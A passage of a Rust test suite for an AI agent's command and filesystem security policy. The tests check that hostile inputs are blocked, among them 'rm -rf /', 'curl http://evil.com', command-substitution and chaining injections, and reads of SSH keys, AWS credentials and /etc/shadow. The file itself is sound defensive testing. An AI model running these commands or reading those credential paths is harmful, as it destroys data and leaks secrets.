use super::*;

fn default_policy() -> SecurityPolicy {
    SecurityPolicy::default()
}

fn readonly_policy() -> SecurityPolicy {
    SecurityPolicy {
        autonomy: AutonomyLevel::ReadOnly,
        ..SecurityPolicy::default()
    }
}

fn full_policy() -> SecurityPolicy {
    SecurityPolicy {
        autonomy: AutonomyLevel::Full,
        ..SecurityPolicy::default()
    }
}

// -- AutonomyLevel ------------------------------------------------

#[test]
fn autonomy_default_is_supervised() {
    assert_eq!(AutonomyLevel::default(), AutonomyLevel::Supervised);
}

#[test]
fn autonomy_serde_roundtrip() {
    let json = serde_json::to_string(&AutonomyLevel::Full).unwrap();
    assert_eq!(json, "\"full\"");
    let parsed: AutonomyLevel = serde_json::from_str("\"readonly\"").unwrap();
    assert_eq!(parsed, AutonomyLevel::ReadOnly);
    let parsed2: AutonomyLevel = serde_json::from_str("\"supervised\"").unwrap();
    assert_eq!(parsed2, AutonomyLevel::Supervised);
}

#[test]
fn can_act_readonly_false() {
    assert!(!readonly_policy().can_act());
}

#[test]
fn can_act_supervised_true() {
    assert!(default_policy().can_act());
}

#[test]
fn can_act_full_true() {
    assert!(full_policy().can_act());
}

#[test]
fn enforce_tool_operation_read_allowed_in_readonly_mode() {
    let p = readonly_policy();
    assert!(p
        .enforce_tool_operation(ToolOperation::Read, "memory_recall")
        .is_ok());
}

#[test]
fn enforce_tool_operation_act_blocked_in_readonly_mode() {
    let p = readonly_policy();
    let err = p
        .enforce_tool_operation(ToolOperation::Act, "memory_store")
        .unwrap_err();
    assert!(err.contains("read-only mode"));
}

#[test]
fn enforce_tool_operation_act_uses_rate_budget() {
    let p = SecurityPolicy {
        max_actions_per_hour: 0,
        ..default_policy()
    };
    let err = p
        .enforce_tool_operation(ToolOperation::Act, "memory_store")
        .unwrap_err();
    assert!(err.contains("Rate limit exceeded"));
}

// -- is_command_allowed -------------------------------------------

#[test]
fn allowed_commands_basic() {
    let p = default_policy();
    assert!(p.is_command_allowed("ls"));
    assert!(p.is_command_allowed("git status"));
    assert!(p.is_command_allowed("cargo build --release"));
    assert!(p.is_command_allowed("cat file.txt"));
    assert!(p.is_command_allowed("grep -r pattern ."));
    assert!(p.is_command_allowed("date"));
}

#[test]
fn allowed_commands_include_windows_read_equivalents() {
    let p = default_policy();
    for command in [
        "dir",
        "type README.md",
        "where node",
        "findstr pattern file.txt",
        "more README.md",
    ] {
        assert!(
            p.is_command_allowed(command),
            "default policy should allow Windows read-only command: {command}"
        );
    }
}

#[test]
fn config_default_policy_includes_windows_read_equivalents() {
    let cfg = crate::openhuman::config::AutonomyConfig::default();
    let p = SecurityPolicy::from_config(&cfg, std::path::Path::new("."));
    for command in [
        "dir",
        "type README.md",
        "where node",
        "findstr pattern file.txt",
        "more README.md",
    ] {
        assert!(
            p.is_command_allowed(command),
            "config-derived policy should allow Windows read-only command: {command}"
        );
    }
    assert!(!p.is_command_allowed("date 2026-05-21"));
}

#[test]
fn blocked_commands_basic() {
    let p = default_policy();
    assert!(!p.is_command_allowed("rm -rf /"));
    assert!(!p.is_command_allowed("sudo apt install"));
    assert!(!p.is_command_allowed("curl http://evil.com"));
    assert!(!p.is_command_allowed("wget http://evil.com"));
    assert!(!p.is_command_allowed("python3 exploit.py"));
    assert!(!p.is_command_allowed("node malicious.js"));
}

#[test]
fn readonly_blocks_all_commands() {
    let p = readonly_policy();
    assert!(!p.is_command_allowed("ls"));
    assert!(!p.is_command_allowed("cat file.txt"));
    assert!(!p.is_command_allowed("echo hello"));
}

#[test]
fn full_autonomy_still_uses_allowlist() {
    let p = full_policy();
    assert!(p.is_command_allowed("ls"));
    assert!(!p.is_command_allowed("rm -rf /"));
}

#[test]
fn command_with_absolute_path_extracts_basename() {
    let p = default_policy();
    assert!(p.is_command_allowed("/usr/bin/git status"));
    assert!(p.is_command_allowed("/bin/ls -la"));
}

#[test]
fn empty_command_blocked() {
    let p = default_policy();
    assert!(!p.is_command_allowed(""));
    assert!(!p.is_command_allowed("   "));
}

#[test]
fn command_with_pipes_validates_all_segments() {
    let p = default_policy();
    // Both sides of the pipe are in the allowlist
    assert!(p.is_command_allowed("ls | grep foo"));
    assert!(p.is_command_allowed("cat file.txt | wc -l"));
    // Second command not in allowlist — blocked
    assert!(!p.is_command_allowed("ls | curl http://evil.com"));
    assert!(!p.is_command_allowed("echo hello | python3 -"));
}

#[test]
fn custom_allowlist() {
    let p = SecurityPolicy {
        allowed_commands: vec!["docker".into(), "kubectl".into()],
        ..SecurityPolicy::default()
    };
    assert!(p.is_command_allowed("docker ps"));
    assert!(p.is_command_allowed("kubectl get pods"));
    assert!(!p.is_command_allowed("ls"));
    assert!(!p.is_command_allowed("git status"));
}

#[test]
fn empty_allowlist_blocks_everything() {
    let p = SecurityPolicy {
        allowed_commands: vec![],
        ..SecurityPolicy::default()
    };
    assert!(!p.is_command_allowed("ls"));
    assert!(!p.is_command_allowed("echo hello"));
}

#[test]
fn command_risk_low_for_read_commands() {
    let p = default_policy();
    assert_eq!(p.command_risk_level("git status"), CommandRiskLevel::Low);
    assert_eq!(p.command_risk_level("ls -la"), CommandRiskLevel::Low);
}

#[test]
fn command_risk_medium_for_mutating_commands() {
    let p = SecurityPolicy {
        allowed_commands: vec!["git".into(), "touch".into()],
        ..SecurityPolicy::default()
    };
    assert_eq!(
        p.command_risk_level("git reset --hard HEAD~1"),
        CommandRiskLevel::Medium
    );
    assert_eq!(
        p.command_risk_level("touch file.txt"),
        CommandRiskLevel::Medium
    );
}

#[test]
fn command_risk_high_for_dangerous_commands() {
    let p = SecurityPolicy {
        allowed_commands: vec!["rm".into()],
        ..SecurityPolicy::default()
    };
    assert_eq!(
        p.command_risk_level("rm -rf /tmp/test"),
        CommandRiskLevel::High
    );
}

#[test]
fn command_risk_high_for_command_executors() {
    let p = default_policy();
    for command in [
        "xargs rm",
        "awk 'BEGIN{system(\"id\")}'",
        "perl -e 'system \"id\"'",
        "python3 -c 'import os; os.system(\"id\")'",
        "pythonw3 -c 'import os; os.system(\"id\")'",
        "ruby -e 'system \"id\"'",
        "bash -lc 'id'",
        "sh -c 'id'",
        "C:\\Python312\\python.EXE -c 'print(1)'",
        "C:\\Python312\\pythonw3.12.exe -c 'print(1)'",
        "/usr/bin/env python3 -c 'print(1)'",
    ] {
        assert_eq!(
            p.command_risk_level(command),
            CommandRiskLevel::High,
            "{command} should be high risk"
        );
    }
}

#[test]
fn validate_command_requires_approval_for_medium_risk() {
    let p = SecurityPolicy {
        autonomy: AutonomyLevel::Supervised,
        require_approval_for_medium_risk: true,
        allowed_commands: vec!["touch".into()],
        ..SecurityPolicy::default()
    };

    let denied = p.validate_command_execution("touch test.txt", false);
    assert!(denied.is_err());
    assert!(denied.unwrap_err().contains("requires explicit approval"),);

    let allowed = p.validate_command_execution("touch test.txt", true);
    assert_eq!(allowed.unwrap(), CommandRiskLevel::Medium);
}

#[test]
fn validate_command_blocks_high_risk_by_default() {
    let p = SecurityPolicy {
        autonomy: AutonomyLevel::Supervised,
        allowed_commands: vec!["rm".into()],
        ..SecurityPolicy::default()
    };

    let result = p.validate_command_execution("rm -rf /tmp/test", true);
    assert!(result.is_err());
    assert!(result.unwrap_err().contains("high-risk"));
}

#[test]
fn validate_command_full_mode_skips_medium_risk_approval_gate() {
    let p = SecurityPolicy {
        autonomy: AutonomyLevel::Full,
        require_approval_for_medium_risk: true,
        allowed_commands: vec!["touch".into()],
        ..SecurityPolicy::default()
    };

    let result = p.validate_command_execution("touch test.txt", false);
    assert_eq!(result.unwrap(), CommandRiskLevel::Medium);
}

#[test]
fn validate_command_rejects_background_chain_bypass() {
    let p = default_policy();
    let result = p.validate_command_execution("ls & python3 -c 'print(1)'", false);
    assert!(result.is_err());
    assert!(result.unwrap_err().contains("not allowed"));
}

// Regression: OPENHUMAN-TAURI-GW (#1813). A multi-byte UTF-8 char straddling
// byte 80 of the command string used to panic the log truncator with
// `byte index 80 is not a char boundary`, killing the core thread. All five
// `&command[..80]` log sites must now round down to a UTF-8 boundary.
#[test]
fn validate_command_does_not_panic_on_multibyte_char_at_log_truncation_boundary() {
    // Real-world Sentry repro: `cmd /c "dir /b "%USERPROFILE%\Desktop\*.lnk"
    // 2>nul | findstr /i "Warcraft WoW 魔兽 Battle"` — the 3-byte `'魔'`
    // occupies bytes 78..81, so a naked `&command[..80]` panics.
    let cmd = "cmd /c \"dir /b \"%USERPROFILE%\\Desktop\\*.lnk\" 2>nul | findstr /i \"Warcraft WoW 魔兽 Battle\"";
    assert!(
        cmd.len() > 80,
        "test fixture must be long enough to trigger truncation"
    );
    assert!(
        !cmd.is_char_boundary(80),
        "test fixture must place a multi-byte char across byte 80"
    );

    // Exercise the allowlist-deny path (cmd starts with "cmd" which is not on
    // the default allowlist), which fires the truncating warn! at policy.rs.
    let p = default_policy();
    let result = p.validate_command_execution(cmd, false);
    assert!(
        result.is_err(),
        "command should be blocked, but did not panic"
    );

    // And the high-risk-blocked path: allowlist passes (curl is allowed), then
    // risk gate fires (curl is a high-risk command), exercising the truncating
    // warn! site at the block_high_risk_commands branch.
    let prefix = "curl https://example.com/";
    let filler = "a".repeat(80 - prefix.len() - 1);
    let high_risk_cmd = format!("{prefix}{filler}魔");
    assert!(
        !high_risk_cmd.is_char_boundary(80),
        "fixture must straddle byte 80 with a multi-byte char"
    );
    let high_risk_policy = SecurityPolicy {
        allowed_commands: vec!["curl".into()],
        ..SecurityPolicy::default()
    };
    let blocked = high_risk_policy.validate_command_execution(&high_risk_cmd, true);
    assert!(blocked.is_err());
    assert!(blocked.unwrap_err().contains("high-risk"));
}

// Pathological short multi-byte command — exercises the boundary logic at the
// edge case where `cmd.len() < 80`.
#[test]
fn validate_command_handles_short_multibyte_command() {
    let p = default_policy();
    // 6 bytes (two 3-byte CJK chars) — well under the 80-byte log cap.
    let _ = p.validate_command_execution("魔兽", false);
}

// -- is_path_allowed ----------------------------------------------

#[test]
fn relative_paths_allowed() {
    let p = default_policy();
    assert!(p.is_path_string_allowed("file.txt"));
    assert!(p.is_path_string_allowed("src/main.rs"));
    assert!(p.is_path_string_allowed("deep/nested/dir/file.txt"));
}

#[test]
fn path_traversal_blocked() {
    let p = default_policy();
    assert!(!p.is_path_string_allowed("../etc/passwd"));
    assert!(!p.is_path_string_allowed("../../root/.ssh/id_rsa"));
    assert!(!p.is_path_string_allowed("foo/../../../etc/shadow"));
    assert!(!p.is_path_string_allowed(".."));
}

#[test]
fn absolute_paths_blocked_when_workspace_only() {
    let p = default_policy();
    assert!(!p.is_path_string_allowed("/etc/passwd"));
    assert!(!p.is_path_string_allowed("/root/.ssh/id_rsa"));
    assert!(!p.is_path_string_allowed("/tmp/file.txt"));
}

#[test]
fn absolute_paths_allowed_when_not_workspace_only() {
    let p = SecurityPolicy {
        workspace_only: false,
        forbidden_paths: vec![],
        ..SecurityPolicy::default()
    };
    assert!(p.is_path_string_allowed("/tmp/file.txt"));
}

#[test]
fn forbidden_paths_blocked() {
    let p = SecurityPolicy {
        workspace_only: false,
        ..SecurityPolicy::default()
    };
    assert!(!p.is_path_string_allowed("/etc/passwd"));
    assert!(!p.is_path_string_allowed("/root/.bashrc"));
    assert!(!p.is_path_string_allowed("~/.ssh/id_rsa"));
    assert!(!p.is_path_string_allowed("~/.gnupg/pubring.kbx"));
}

#[test]
fn empty_path_allowed() {
    let p = default_policy();
    assert!(p.is_path_string_allowed(""));
}

#[test]
fn dotfile_in_workspace_allowed() {
    let p = default_policy();
    assert!(p.is_path_string_allowed(".gitignore"));
    assert!(p.is_path_string_allowed(".env"));
}

// -- is_path_allowed — symlink safety (#1927) ---------------------

#[cfg(unix)]
#[test]
fn symlink_inside_workspace_escaping_outside_is_blocked() {
    use std::os::unix::fs::symlink;

    let workspace = tempfile::tempdir().expect("workspace tempdir");
    let outside = tempfile::tempdir().expect("outside tempdir");
    let target = outside.path().join("secret.txt");
    std::fs::write(&target, "secret").expect("write secret");

    let link = workspace.path().join("evil");
    symlink(&target, &link).expect("create symlink");

    let p = SecurityPolicy {
        workspace_dir: workspace.path().to_path_buf(),
        workspace_only: true,
        forbidden_paths: vec![],
        ..SecurityPolicy::default()
    };

    // String-level checks pass: "evil" has no "..", isn't absolute, and is
    // not in forbidden_paths. The canonicalize step must catch the symlink
    // pointing outside the workspace root.
    assert!(
        !p.is_path_string_allowed("evil"),
        "symlink that escapes the workspace must be blocked"
    );
}

#[cfg(unix)]
#[test]
fn symlink_to_forbidden_tree_is_blocked() {
    use std::os::unix::fs::symlink;

    let workspace = tempfile::tempdir().expect("workspace tempdir");
    let forbidden = tempfile::tempdir().expect("forbidden tempdir");
    let target = forbidden.path().join("secret");
    std::fs::write(&target, "x").expect("write secret");

    let link = workspace.path().join("link-to-forbidden");
    symlink(&target, &link).expect("create symlink");

    let p = SecurityPolicy {
        workspace_dir: workspace.path().to_path_buf(),
        // Disable workspace_only so the assertion isolates the forbidden_paths
        // path (the symlink escapes the workspace, which would also trip
        // workspace_only — but here we want to prove the forbidden_paths
        // check itself canonicalizes).
        workspace_only: false,
        forbidden_paths: vec![forbidden.path().to_string_lossy().to_string()],
        ..SecurityPolicy::default()
    };

    // The string "link-to-forbidden" does not start with the forbidden
    // tempdir path, so the string-level check passes. Canonical resolution
    // must catch that it resolves into the forbidden tree.
    assert!(
        !p.is_path_string_allowed("link-to-forbidden"),
        "symlink that resolves into a forbidden tree must be blocked"
    );
}

#[test]
fn write_to_not_yet_existing_path_in_workspace_still_allowed() {
    // After adding the symlink-safe canonicalize step, writing to a
    // not-yet-existing path inside the workspace must still pass — the
    // parent-dir fallback canonicalizes the parent and confirms it is
    // inside the workspace root.
    let workspace = tempfile::tempdir().expect("workspace tempdir");
    let p = SecurityPolicy {
        workspace_dir: workspace.path().to_path_buf(),
        workspace_only: true,
        forbidden_paths: vec![],
        ..SecurityPolicy::default()
    };

    assert!(p.is_path_string_allowed("new-file.txt"));
    // Whole parent chain missing too — helper returns None, and we fall
    // back to the string-level checks (which would pass for a
    // workspace-relative non-traversal path).
    assert!(p.is_path_string_allowed("not-yet-existing/subdir/file.txt"));
}

// -- from_config --------------------------------------------------

#[test]
fn from_config_maps_all_fields() {
    let autonomy_config = crate::openhuman::config::AutonomyConfig {
        level: AutonomyLevel::Full,
        workspace_only: false,
        allowed_commands: vec!["docker".into()],
        forbidden_paths: vec!["/secret".into()],
        max_actions_per_hour: 100,
        max_cost_per_day_cents: 1000,
        require_approval_for_medium_risk: false,
        block_high_risk_commands: false,
        ..crate::openhuman::config::AutonomyConfig::default()
    };
    let workspace = PathBuf::from("/tmp/test-workspace");
    let policy = SecurityPolicy::from_config(&autonomy_config, &workspace);

    assert_eq!(policy.autonomy, AutonomyLevel::Full);
    assert!(!policy.workspace_only);
    assert_eq!(policy.allowed_commands, vec!["docker"]);
    assert_eq!(policy.forbidden_paths, vec!["/secret"]);
    assert_eq!(policy.max_actions_per_hour, 100);
    assert_eq!(policy.max_cost_per_day_cents, 1000);
    assert!(!policy.require_approval_for_medium_risk);
    assert!(!policy.block_high_risk_commands);
    assert_eq!(policy.workspace_dir, PathBuf::from("/tmp/test-workspace"));
}

// -- Default policy -----------------------------------------------

#[test]
fn default_policy_has_sane_values() {
    let p = SecurityPolicy::default();
    assert_eq!(p.autonomy, AutonomyLevel::Supervised);
    assert!(p.workspace_only);
    assert!(!p.allowed_commands.is_empty());
    assert!(!p.forbidden_paths.is_empty());
    assert!(p.max_actions_per_hour > 0);
    assert!(p.max_cost_per_day_cents > 0);
    assert!(p.require_approval_for_medium_risk);
    assert!(p.block_high_risk_commands);
}

// -- ActionTracker / rate limiting --------------------------------

#[test]
fn action_tracker_starts_at_zero() {
    let tracker = ActionTracker::new();
    assert_eq!(tracker.count(), 0);
}

#[test]
fn action_tracker_records_actions() {
    let tracker = ActionTracker::new();
    assert_eq!(tracker.record(), 1);
    assert_eq!(tracker.record(), 2);
    assert_eq!(tracker.record(), 3);
    assert_eq!(tracker.count(), 3);
}

#[test]
fn record_action_allows_within_limit() {
    let p = SecurityPolicy {
        max_actions_per_hour: 5,
        ..SecurityPolicy::default()
    };
    for _ in 0..5 {
        assert!(p.record_action(), "should allow actions within limit");
    }
}

#[test]
fn record_action_blocks_over_limit() {
    let p = SecurityPolicy {
        max_actions_per_hour: 3,
        ..SecurityPolicy::default()
    };
    assert!(p.record_action()); // 1
    assert!(p.record_action()); // 2
    assert!(p.record_action()); // 3
    assert!(!p.record_action()); // 4 — over limit
}

#[test]
fn is_rate_limited_reflects_count() {
    let p = SecurityPolicy {
        max_actions_per_hour: 2,
        ..SecurityPolicy::default()
    };
    assert!(!p.is_rate_limited());
    p.record_action();
    assert!(!p.is_rate_limited());
    p.record_action();
    assert!(p.is_rate_limited());
}

#[test]
fn action_tracker_clone_is_independent() {
    let tracker = ActionTracker::new();
    tracker.record();
    tracker.record();
    let cloned = tracker.clone();
    assert_eq!(cloned.count(), 2);
    tracker.record();
    assert_eq!(tracker.count(), 3);
    assert_eq!(cloned.count(), 2); // clone is independent
}

// -- Edge cases: command injection --------------------------------

#[test]
fn command_injection_semicolon_blocked() {
    let p = default_policy();
    // First word is "ls;" (with semicolon) — doesn't match "ls" in allowlist.
    // This is a safe default: chained commands are blocked.
    assert!(!p.is_command_allowed("ls; rm -rf /"));
}

#[test]
fn command_injection_semicolon_no_space() {
    let p = default_policy();
    assert!(!p.is_command_allowed("ls;rm -rf /"));
}

#[test]
fn quoted_semicolons_do_not_split_sqlite_command() {
    let p = SecurityPolicy {
        allowed_commands: vec!["sqlite3".into()],
        ..SecurityPolicy::default()
    };
    assert!(p.is_command_allowed(
        "sqlite3 /tmp/test.db \"CREATE TABLE t(id INT); INSERT INTO t VALUES(1); SELECT * FROM t;\""
    ));
    assert_eq!(
        p.command_risk_level(
            "sqlite3 /tmp/test.db \"CREATE TABLE t(id INT); INSERT INTO t VALUES(1); SELECT * FROM t;\""
        ),
        CommandRiskLevel::Low
    );
}

#[test]
fn unquoted_semicolon_after_quoted_sql_still_splits_commands() {
    let p = SecurityPolicy {
        allowed_commands: vec!["sqlite3".into()],
        ..SecurityPolicy::default()
    };
    assert!(!p.is_command_allowed("sqlite3 /tmp/test.db \"SELECT 1;\"; rm -rf /"));
}

#[test]
fn command_injection_backtick_blocked() {
    let p = default_policy();
    assert!(!p.is_command_allowed("echo `whoami`"));
    assert!(!p.is_command_allowed("echo `rm -rf /`"));
}

#[test]
fn command_injection_dollar_paren_blocked() {
    let p = default_policy();
    assert!(!p.is_command_allowed("echo $(cat /etc/passwd)"));
    assert!(!p.is_command_allowed("echo $(rm -rf /)"));
}

#[test]
fn command_with_env_var_prefix() {
    let p = default_policy();
    // "FOO=bar" is the first word — not in allowlist
    assert!(!p.is_command_allowed("FOO=bar rm -rf /"));
}

#[test]
fn command_newline_injection_blocked() {
    let p = default_policy();
    // Newline splits into two commands; "rm" is not in allowlist
    assert!(!p.is_command_allowed("ls\nrm -rf /"));
    // Both allowed — OK
    assert!(p.is_command_allowed("ls\necho hello"));
}

#[test]
fn command_injection_and_chain_blocked() {
    let p = default_policy();
    assert!(!p.is_command_allowed("ls && rm -rf /"));
    assert!(!p.is_command_allowed("echo ok && curl http://evil.com"));
    // Both allowed — OK
    assert!(p.is_command_allowed("ls && echo done"));
}

#[test]
fn command_injection_or_chain_blocked() {
    let p = default_policy();
    assert!(!p.is_command_allowed("ls || rm -rf /"));
    // Both allowed — OK
    assert!(p.is_command_allowed("ls || echo fallback"));
}

#[test]
fn command_injection_background_chain_blocked() {
    let p = default_policy();
    assert!(!p.is_command_allowed("ls & rm -rf /"));
    assert!(!p.is_command_allowed("ls&rm -rf /"));
    assert!(!p.is_command_allowed("echo ok & python3 -c 'print(1)'"));
}

#[test]
fn command_injection_redirect_blocked() {
    let p = default_policy();
    assert!(!p.is_command_allowed("echo secret > /etc/crontab"));
    assert!(!p.is_command_allowed("ls >> /tmp/exfil.txt"));
}

#[test]
fn quoted_ampersand_and_redirect_literals_are_not_treated_as_operators() {
    let p = default_policy();
    assert!(p.is_command_allowed("echo \"A&B\""));
    assert!(p.is_command_allowed("echo \"A>B\""));
}

#[test]
fn command_argument_injection_blocked() {
    let p = default_policy();
    // find -exec is a common bypass
    assert!(!p.is_command_allowed("find . -exec rm -rf {} +"));
    assert!(!p.is_command_allowed("find / -ok cat {} \\;"));
    // git config/alias can execute commands
    assert!(!p.is_command_allowed("git config core.editor \"rm -rf /\""));
    assert!(!p.is_command_allowed("git alias.st status"));
    assert!(!p.is_command_allowed("git -c core.editor=calc.exe commit"));
    // Legitimate commands should still work
    assert!(p.is_command_allowed("find . -name '*.txt'"));
    assert!(p.is_command_allowed("git status"));
    assert!(p.is_command_allowed("git add ."));
}

#[test]
fn custom_allowlist_cannot_enable_command_executors() {
    let p = SecurityPolicy {
        allowed_commands: vec![
            "echo".into(),
            "xargs".into(),
            "awk".into(),
            "perl".into(),
            "python".into(),
            "python3".into(),
            "python3.12".into(),
            "python.EXE".into(),
            "pythonw3".into(),
            "pythonw3.12.exe".into(),
            "ruby".into(),
            "bash".into(),
            "sh".into(),
            "env".into(),
        ],
        ..SecurityPolicy::default()
    };

    for command in [
        "echo rm -rf / | xargs",
        "awk 'BEGIN{system(\"id\")}'",
        "perl -e 'system \"id\"'",
        "python -c 'import os; os.system(\"id\")'",
        "python3 exploit.py",
        "python3.12 -c 'print(1)'",
        "/usr/bin/python3.12 -c 'print(1)'",
        "C:\\Python312\\python.EXE -c 'print(1)'",
        "pythonw3 exploit.py",
        "C:\\Python312\\pythonw3.12.exe -c 'print(1)'",
        "ruby -e 'system \"id\"'",
        "bash -lc 'id'",
        "sh -c 'id'",
        "/usr/bin/env python3 -c 'print(1)'",
    ] {
        assert!(
            !p.is_command_allowed(command),
            "{command} should remain blocked even when allowlisted"
        );
    }
}

#[test]
fn command_injection_dollar_brace_blocked() {
    let p = default_policy();
    assert!(!p.is_command_allowed("echo ${IFS}cat${IFS}/etc/passwd"));
}

#[test]
fn command_injection_tee_blocked() {
    let p = default_policy();
    assert!(!p.is_command_allowed("echo secret | tee /etc/crontab"));
    assert!(!p.is_command_allowed("ls | /usr/bin/tee outfile"));
    assert!(!p.is_command_allowed("tee file.txt"));
}

#[test]
fn command_injection_process_substitution_blocked() {
    let p = default_policy();
    assert!(!p.is_command_allowed("cat <(echo pwned)"));
    assert!(!p.is_command_allowed("ls >(cat /etc/passwd)"));
}

#[test]
fn command_env_var_prefix_with_allowed_cmd() {
    let p = default_policy();
    // env assignment + allowed command — OK
    assert!(p.is_command_allowed("FOO=bar ls"));
    assert!(p.is_command_allowed("LANG=C grep pattern file"));
    // env assignment + disallowed command — blocked
    assert!(!p.is_command_allowed("FOO=bar rm -rf /"));
}

// -- Edge cases: path traversal -----------------------------------

#[test]
fn path_traversal_encoded_dots() {
    let p = default_policy();
    // Literal ".." in path — always blocked
    assert!(!p.is_path_string_allowed("foo/..%2f..%2fetc/passwd"));
}

#[test]
fn path_traversal_double_dot_in_filename() {
    let p = default_policy();
    // ".." in a filename (not a path component) is allowed
    assert!(p.is_path_string_allowed("my..file.txt"));
    // But actual traversal components are still blocked
    assert!(!p.is_path_string_allowed("../etc/passwd"));
    assert!(!p.is_path_string_allowed("foo/../etc/passwd"));
}

#[test]
fn path_with_null_byte_blocked() {
    let p = default_policy();
    assert!(!p.is_path_string_allowed("file\0.txt"));
}

#[test]
fn path_symlink_style_absolute() {
    let p = default_policy();
    assert!(!p.is_path_string_allowed("/proc/self/root/etc/passwd"));
}

#[test]
fn path_home_tilde_ssh() {
    let p = SecurityPolicy {
        workspace_only: false,
        ..SecurityPolicy::default()
    };
    assert!(!p.is_path_string_allowed("~/.ssh/id_rsa"));
    assert!(!p.is_path_string_allowed("~/.gnupg/secring.gpg"));
}

#[test]
fn path_var_run_blocked() {
    let p = SecurityPolicy {
        workspace_only: false,
        ..SecurityPolicy::default()
    };
    assert!(!p.is_path_string_allowed("/var/run/docker.sock"));
}

// -- Edge cases: rate limiter boundary ----------------------------

#[test]
fn rate_limit_exactly_at_boundary() {
    let p = SecurityPolicy {
        max_actions_per_hour: 1,
        ..SecurityPolicy::default()
    };
    assert!(p.record_action()); // 1 — exactly at limit
    assert!(!p.record_action()); // 2 — over
    assert!(!p.record_action()); // 3 — still over
}

#[test]
fn rate_limit_zero_blocks_everything() {
    let p = SecurityPolicy {
        max_actions_per_hour: 0,
        ..SecurityPolicy::default()
    };
    assert!(!p.record_action());
}

#[test]
fn rate_limit_high_allows_many() {
    let p = SecurityPolicy {
        max_actions_per_hour: 10000,
        ..SecurityPolicy::default()
    };
    for _ in 0..100 {
        assert!(p.record_action());
    }
}

// -- Edge cases: autonomy + command combos ------------------------

#[test]
fn readonly_blocks_even_safe_commands() {
    let p = SecurityPolicy {
        autonomy: AutonomyLevel::ReadOnly,
        allowed_commands: vec!["ls".into(), "cat".into()],
        ..SecurityPolicy::default()
    };
    assert!(!p.is_command_allowed("ls"));
    assert!(!p.is_command_allowed("cat"));
    assert!(!p.can_act());
}

#[test]
fn supervised_allows_listed_commands() {
    let p = SecurityPolicy {
        autonomy: AutonomyLevel::Supervised,
        allowed_commands: vec!["git".into()],
        ..SecurityPolicy::default()
    };
    assert!(p.is_command_allowed("git status"));
    assert!(!p.is_command_allowed("docker ps"));
}

#[test]
fn full_autonomy_still_respects_forbidden_paths() {
    let p = SecurityPolicy {
        autonomy: AutonomyLevel::Full,
        workspace_only: false,
        ..SecurityPolicy::default()
    };
    assert!(!p.is_path_string_allowed("/etc/shadow"));
    assert!(!p.is_path_string_allowed("/root/.bashrc"));
}

// -- Edge cases: from_config preserves tracker --------------------

#[test]
fn from_config_creates_fresh_tracker() {
    let autonomy_config = crate::openhuman::config::AutonomyConfig {
        level: AutonomyLevel::Full,
        workspace_only: false,
        allowed_commands: vec![],
        forbidden_paths: vec![],
        max_actions_per_hour: 10,
        max_cost_per_day_cents: 100,
        require_approval_for_medium_risk: true,
        block_high_risk_commands: true,
        ..crate::openhuman::config::AutonomyConfig::default()
    };
    let workspace = PathBuf::from("/tmp/test");
    let policy = SecurityPolicy::from_config(&autonomy_config, &workspace);
    assert_eq!(policy.tracker.count(), 0);
    assert!(!policy.is_rate_limited());
}

// =================================================================
// SECURITY CHECKLIST TESTS
// Checklist: inbound surfaces not public, pairing required,
//            filesystem scoped (no /), access via tunnel
// =================================================================

// -- Checklist #3: Filesystem scoped (no /) -----------------------

#[test]
fn checklist_root_path_blocked() {
    let p = default_policy();
    if cfg!(windows) {
        assert!(!p.is_path_string_allowed("C:\\"));
        assert!(!p.is_path_string_allowed("C:\\anything"));
    } else {
        assert!(!p.is_path_string_allowed("/"));
        assert!(!p.is_path_string_allowed("/anything"));
    }
}

#[test]
fn checklist_all_system_dirs_blocked() {
    let p = SecurityPolicy {
        workspace_only: false,
        ..SecurityPolicy::default()
    };
    for dir in [
        "/etc", "/root", "/home", "/usr", "/bin", "/sbin", "/lib", "/opt", "/boot", "/dev",
        "/proc", "/sys", "/var", "/tmp",
    ] {
        assert!(
            !p.is_path_string_allowed(dir),
            "System dir should be blocked: {dir}"
        );
        assert!(
            !p.is_path_string_allowed(&format!("{dir}/subpath")),
            "Subpath of system dir should be blocked: {dir}/subpath"
        );
    }
}

#[test]
fn checklist_sensitive_dotfiles_blocked() {
    let p = SecurityPolicy {
        workspace_only: false,
        ..SecurityPolicy::default()
    };
    for path in [
        "~/.ssh/id_rsa",
        "~/.gnupg/secring.gpg",
        "~/.aws/credentials",
        "~/.config/secrets",
    ] {
        assert!(
            !p.is_path_string_allowed(path),
            "Sensitive dotfile should be blocked: {path}"
        );
    }
}

#[test]
fn checklist_null_byte_injection_blocked() {
    let p = default_policy();
    assert!(!p.is_path_string_allowed("safe\0/../../../etc/passwd"));
    assert!(!p.is_path_string_allowed("\0"));
    assert!(!p.is_path_string_allowed("file\0"));
}

#[test]
fn checklist_workspace_only_blocks_all_absolute() {
    let p = SecurityPolicy {
        workspace_only: true,
        ..SecurityPolicy::default()
    };
    if cfg!(windows) {
        assert!(!p.is_path_string_allowed("C:\\any\\absolute\\path"));
    } else {
        assert!(!p.is_path_string_allowed("/any/absolute/path"));
    }
    assert!(p.is_path_string_allowed("relative/path.txt"));
}

#[test]
fn checklist_resolved_path_must_be_in_workspace() {
    let p = SecurityPolicy {
        workspace_dir: PathBuf::from("/home/user/project"),
        ..SecurityPolicy::default()
    };
    // Inside workspace — allowed
    assert!(p.is_resolved_path_allowed(Path::new("/home/user/project/src/main.rs")));
    // Outside workspace — blocked (symlink escape)
    assert!(!p.is_resolved_path_allowed(Path::new("/etc/passwd")));
    assert!(!p.is_resolved_path_allowed(Path::new("/home/user/other_project/file")));
    // Root — blocked
    assert!(!p.is_resolved_path_allowed(Path::new("/")));
}

#[test]
fn checklist_default_policy_is_workspace_only() {
    let p = SecurityPolicy::default();
    assert!(
        p.workspace_only,
        "Default policy must be workspace_only=true"
    );
}

#[test]
fn checklist_default_forbidden_paths_comprehensive() {
    let p = SecurityPolicy::default();
    // Must contain all critical system dirs
    for dir in ["/etc", "/root", "/proc", "/sys", "/dev", "/var", "/tmp"] {
        assert!(
            p.forbidden_paths.iter().any(|f| f == dir),
            "Default forbidden_paths must include {dir}"
        );
    }
    // Must contain sensitive dotfiles
    for dot in ["~/.ssh", "~/.gnupg", "~/.aws"] {
        assert!(
            p.forbidden_paths.iter().any(|f| f == dot),
            "Default forbidden_paths must include {dot}"
        );
    }
}

// -- 1.2 Path resolution / symlink bypass tests -------------------

#[test]
fn resolved_path_blocks_outside_workspace() {
    let workspace = std::env::temp_dir().join("openhuman_test_resolved_path");
    let _ = std::fs::create_dir_all(&workspace);

    // Use the canonicalized workspace so starts_with checks match
    let canonical_workspace = workspace
        .canonicalize()
